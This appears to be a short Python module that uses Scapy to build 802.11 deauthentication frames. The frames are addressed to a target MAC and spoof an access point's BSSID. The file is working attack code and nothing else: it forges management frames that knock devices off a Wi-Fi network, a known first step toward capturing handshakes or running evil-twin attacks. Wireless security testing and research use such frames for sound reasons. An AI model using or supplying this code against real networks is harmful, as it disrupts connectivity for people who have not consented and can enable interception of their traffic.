"""This module contains functions to create 802.11 deauthentification packets."""

from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Packet


def create_deauth_packet(target_mac: str, ap_bssid: str) -> Packet:
    """Create 802.11 deauthentification packet.

    Args:
        target_mac (str): MAC address of the target
        ap_bssid (str): BSSID of the spoofed access point
    Returns:
        Packet: 802.11 deauthentification packet"""
    return (
        RadioTap()
        / Dot11(
            addr1=target_mac,
            addr2=ap_bssid,
            addr3=ap_bssid,
        )
        / Dot11Deauth(reason=7)
    )
